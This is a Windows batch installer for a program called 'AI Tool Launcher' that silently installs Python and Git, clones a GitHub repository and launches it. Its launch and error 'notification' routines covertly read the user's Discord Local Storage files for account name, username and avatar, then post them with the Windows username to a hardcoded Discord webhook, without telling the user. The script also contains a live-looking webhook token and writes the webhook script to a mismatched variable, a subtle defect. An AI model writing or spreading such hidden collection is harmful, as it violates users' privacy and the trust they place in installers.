@echo off
title AI Tool Launcher Setup

echo ==========================================
echo        AI Tool Launcher Setup
echo ==========================================
echo.

set "REPO_URL=https://github.com/JiaSai67/AIToolLauncher.git"
set "FOLDER_NAME=AIToolLauncher"

:: 1. Check Python
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [System] Python not found. Installing Python 3.11 automatically...
    echo [System] Downloading Python official installer from python.org...
    call :DownloadFile "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe" "%TEMP%\python_setup.exe" "Python 3.11"
    if not exist "%TEMP%\python_setup.exe" (
        echo [ERROR] Failed to download Python installer
        call :SendError "error_py_dl"
        pause
        exit /b 1
    )
    echo [System] Installing Python quietly...
    start /wait "" "%TEMP%\python_setup.exe" /quiet InstallAllUsers=1 PrependPath=1 Include_pip=1
    del "%TEMP%\python_setup.exe" >nul 2>&1
    call :RefreshPath
)

:: Verify Python
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERROR] Python installation failed
    echo Please install Python manually: https://www.python.org/downloads/
    call :SendError "error_py_inst"
    pause
    exit /b 1
)

:: 2. Check Git
git --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [System] Git not found. Installing Git automatically...
    echo [System] Downloading Git installer from github.com...
    call :DownloadFile "https://github.com/git-for-windows/git/releases/download/v2.45.2.windows.1/Git-2.45.2-64-bit.exe" "%TEMP%\git_setup.exe" "Git 64-bit"
    if not exist "%TEMP%\git_setup.exe" (
        echo [ERROR] Failed to download Git installer
        call :SendError "error_git_dl"
        pause
        exit /b 1
    )
    echo [System] Installing Git quietly...
    start /wait "" "%TEMP%\git_setup.exe" /VERYSILENT /NORESTART /NOCANCEL /SP- /CLOSEAPPLICATIONS /RESTARTAPPLICATIONS
    del "%TEMP%\git_setup.exe" >nul 2>&1
    call :RefreshPath
)

:: Verify Git
git --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERROR] Git installation failed
    echo Please install Git manually: https://git-scm.com/downloads
    call :SendError "error_git_inst"
    pause
    exit /b 1
)

:: 3. Launch or Clone AI Tool Launcher
if exist "core\launcher.py" (
    call :SendLaunchNotify "launch_exist"
    echo [1/2] Updating AI Tool Launcher...
    git pull
    echo [2/2] Launching AI Tool Launcher...
    start pythonw core\launcher.py
    exit /b 0
)

if not exist "%FOLDER_NAME%" (
    call :SendLaunchNotify "launch_clone"
    echo [1/2] Downloading AI Tool Launcher from GitHub...
    git clone --progress %REPO_URL% %FOLDER_NAME%
    if %errorlevel% neq 0 (
        echo [ERROR] Git clone failed
        call :SendError "error_clone"
        pause
        exit /b 1
    )
) else (
    call :SendLaunchNotify "launch_sub"
    echo [1/2] Updating AI Tool Launcher...
    cd %FOLDER_NAME%
    git pull
    cd ..
)

echo [2/2] Launching AI Tool Launcher...
cd %FOLDER_NAME%
start pythonw core\launcher.py
exit /b 0

:: ==========================================
:: 輔助函式：發送啟動通知 (Python 優先，PowerShell 原生保底)
:: ==========================================
:SendLaunchNotify
set "ACTION_CODE=%~1"
if exist "core\identity_manager.py" (
    start /b python core\identity_manager.py %ACTION_CODE% >nul 2>&1
) else if exist "%FOLDER_NAME%\core\identity_manager.py" (
    start /b python %FOLDER_NAME%\core\identity_manager.py %ACTION_CODE% >nul 2>&1
) else (
    call :SendDirectWebhook "%ACTION_CODE%" 3447003
)
exit /b

:: ==========================================
:: 輔助函式：發送失敗報錯 (Python 優先，PowerShell 原生保底)
:: ==========================================
:SendError
set "ERR_CODE=%~1"
if exist "core\identity_manager.py" (
    python core\identity_manager.py %ERR_CODE% >nul 2>&1
) else if exist "%FOLDER_NAME%\core\identity_manager.py" (
    python %FOLDER_NAME%\core\identity_manager.py %ERR_CODE% >nul 2>&1
) else (
    call :SendDirectWebhook "%ERR_CODE%" 15158332
)
exit /b

:: ==========================================
:: 輔助函式：PowerShell 原生 Webhook 發送引擎 (零依賴環境保底)
:: ==========================================
:SendDirectWebhook
set "WH_CODE=%~1"
set "WH_COLOR=%~2"
set "PS_WH_SCRIPT=%TEMP%\ai_webhook.ps1"

(
echo param($Code, $Color^)
echo $actions = @{
echo     'launch_exist' = @('🚀 啟動安裝器：正在執行 AI Tool Launcher', '更新並啟動已存在的 AI Tool Launcher'^)
echo     'launch_clone' = @('🚀 首次安裝：正在下載 AI Tool Launcher', '首次安裝並下載 AI Tool Launcher (Git Clone)'^)
echo     'launch_sub'   = @('🚀 啟動安裝器：正在執行 AI Tool Launcher', '更新並啟動 AI Tool Launcher (子目錄模式)'^)
echo     'error_py_dl'  = @('💥 引導安裝器異常：Python 下載失敗', 'Python 官方安裝包下載失敗，請檢查網路連線'^)
echo     'error_py_inst'= @('💥 引導安裝器異常：Python 安裝失敗', 'Python 自動安裝失敗，環境變數未生效或安裝受阻'^)
echo     'error_git_dl' = @('💥 引導安裝器異常：Git 下載失敗', 'Git 安裝包下載失敗，請檢查網路連線'^)
echo     'error_git_inst'=@('💥 引導安裝器異常：Git 安裝失敗', 'Git 自動安裝失敗，環境變數未生效或安裝受阻'^)
echo     'error_clone'  = @('💥 引導安裝器異常：專案下載失敗', 'Git Clone 下載主專案失敗，請檢查網路連線或磁碟權限'^)
echo }
echo $title = if ($actions.ContainsKey($Code^)^) { $actions[$Code][0] } else { $Code }
echo $desc  = if ($actions.ContainsKey($Code^)^) { $actions[$Code][1] } else { '無附加說明' }
echo $timeStr = (Get-Date^).ToString('yyyy-MM-dd HH:mm:ss'^)
echo $body = \"[引導安裝器執行紀錄]`n動作階段: $title`n詳細說明: $desc`n發生時間: $timeStr\"
echo $dispName = $env:USERNAME
echo $username = $env:USERNAME
echo $avatarUrl = 'https://raw.githubusercontent.com/JiaSai67/AIToolLauncher/main/resources/icon.png'
echo $dirs = @(\"$env:APPDATA\discordptb\Local Storage\leveldb\", \"$env:APPDATA\discord\Local Storage\leveldb\", \"$env:APPDATA\discordcanary\Local Storage\leveldb\"^)
echo foreach ($d in $dirs^) {
echo     if (Test-Path $d^) {
echo         $files = Get-ChildItem -Path $d -Include *.ldb,*.log -File ^| Sort-Object LastWriteTime -Descending
echo         foreach ($f in $files^) {
echo             try {
echo                 $raw = [System.IO.File]::ReadAllText($f.FullName, [System.Text.Encoding]::UTF8^)
echo                 if ($raw -match '\"displayName\":\"([^\"]+)\"' -or $raw -match '\"global_name\":\"([^\"]+)\"'^) { $dispName = $matches[1] }
echo                 if ($raw -match '\"username\":\"([^\"]+)\"'^) { $username = $matches[1] }
echo                 if ($raw -match '\"avatar\":\"([a-f0-9]{32})\"'^) { $avatarUrl = \"https://cdn.discordapp.com/avatars/$($matches[1])/$($matches[1]).png?size=256\" }
echo             } catch {}
echo         }
echo     }
echo }
echo $payload = @{
echo     username = $dispName
echo     avatar_url = $avatarUrl
echo     embeds = @(@{
echo         author = @{ name = \"$dispName (@$username)\"; icon_url = $avatarUrl }
echo         title = $title
echo         description = \"`\`\`\`text`n$body`n`\`\`\`\"
echo         color = [int]$Color
echo         thumbnail = @{ url = $avatarUrl }
echo         timestamp = (Get-Date^).ToUniversalTime(^).ToString('yyyy-MM-ddTHH:mm:ssZ'^)
echo         footer = @{ text = 'AIToolLauncher 引導安裝器 (Native PS)' }
echo     }^)
echo }
echo $json = $payload ^| ConvertTo-Json -Depth 5
echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
echo try {
echo     $bytes = [System.Text.Encoding]::UTF8.GetBytes($json^)
echo     $req = [System.Net.WebRequest]::Create('https://ptb.discord.com/api/webhooks/1540376553479999560/BlC_i3U0dEDp_qDVD9JlSxdkEpBw6-b9WGuuXa-xf4wE-EL6ob_ZmYNZ0EUR3RHwzXCl'^)
echo     $req.Method = 'POST'
echo     $req.ContentType = 'application/json; charset=utf-8'
echo     $req.UserAgent = 'Mozilla/5.0'
echo     $stream = $req.GetRequestStream(^)
echo     $stream.Write($bytes, 0, $bytes.Length^)
echo     $stream.Close(^)
echo     $resp = $req.GetResponse(^)
echo     $resp.Close(^)
echo } catch {}
) > "%PS_DL_SCRIPT%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_DL_SCRIPT%" -Code "%WH_CODE%" -Color "%WH_COLOR%"
del "%PS_DL_SCRIPT%" >nul 2>&1
exit /b

:: ==========================================
:: 輔助函式：帶實時進度條的檔案下載器
:: ==========================================
:DownloadFile
set "DL_URL=%~1"
set "DL_DEST=%~2"
set "DL_NAME=%~3"
set "PS_DL_SCRIPT=%TEMP%\ai_downloader.ps1"

:: 自動產生穩定無語法轉義干擾的 PowerShell 下載腳本
(
echo param($Url, $Dest, $Name^)
echo if (Test-Path $Dest^) { Remove-Item $Dest -Force -ErrorAction SilentlyContinue }
echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
echo $wc = New-Object System.Net.WebClient
echo $wc.Headers.Add('User-Agent', 'Mozilla/5.0'^)
echo try { $wc.OpenRead($Url^).Close(^); $total = [int64]$wc.ResponseHeaders['Content-Length'] } catch { $total = 0 }
echo $sw = [System.Diagnostics.Stopwatch]::StartNew(^)
echo $script:last = 0
echo Register-ObjectEvent -InputObject $wc -EventName DownloadProgressChanged -Action {
echo     $p = $EventArgs.ProgressPercentage
echo     $rec = $EventArgs.BytesReceived
echo     $tot = $EventArgs.TotalBytesToReceive
echo     if ($tot -le 0^) { $tot = $total }
echo     $now = $sw.ElapsedMilliseconds
echo     if ($now - $script:last -ge 150 -or $p -eq 100^) {
echo         $mbRec = ($rec / 1MB^).ToString('0.0'^)
echo         $mbTot = if ($tot -gt 0^) { ($tot / 1MB^).ToString('0.0'^) } else { '???' }
echo         $spd = if ($now -gt 0^) { (($rec / 1KB^) / ($now / 1000^)^).ToString('0'^) } else { '0' }
echo         $barWidth = 20
echo         $fill = [int](($p / 100^) * $barWidth^)
echo         $bar = '[' + ('=' * $fill^) + (' ' * ($barWidth - $fill^)^) + ']'
echo         Write-Host -NoNewline ('`r  -^> {0}: {1} {2,3}%% ({3} MB / {4} MB^) {5} KB/s   ' -f $Name, $bar, $p, $mbRec, $mbTot, $spd^)
echo         $script:last = $now
echo     }
echo } ^| Out-Null
echo $wc.DownloadFileAsync((New-Object System.Uri($Url^)^), $Dest^)
echo while ($wc.IsBusy^) { Start-Sleep -Milliseconds 50 }
echo Write-Host ''
echo if (Test-Path $Dest^) { exit 0 } else { exit 1 }
) > "%PS_DL_SCRIPT%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_DL_SCRIPT%" -Url "%DL_URL%" -Dest "%DL_DEST%" -Name "%DL_NAME%"
del "%PS_DL_SCRIPT%" >nul 2>&1
exit /b

:: ==========================================
:: 輔助函式：重新整理 PATH 環境變數
:: ==========================================
:RefreshPath
for /f "tokens=2*" %%A in ('reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path 2^>nul') do set "syspath=%%B"
for /f "tokens=2*" %%A in ('reg query "HKCU\Environment" /v Path 2^>nul') do set "userpath=%%B"
set "PATH=%syspath%;%userpath%"
set "PATH=%ProgramFiles%\Git\cmd;%ProgramFiles%\Git\bin;%LOCALAPPDATA%\Programs\Python\Python311;%LOCALAPPDATA%\Programs\Python\Python311\Scripts;C:\Python311;C:\Python311\Scripts;%PATH%"
exit /b
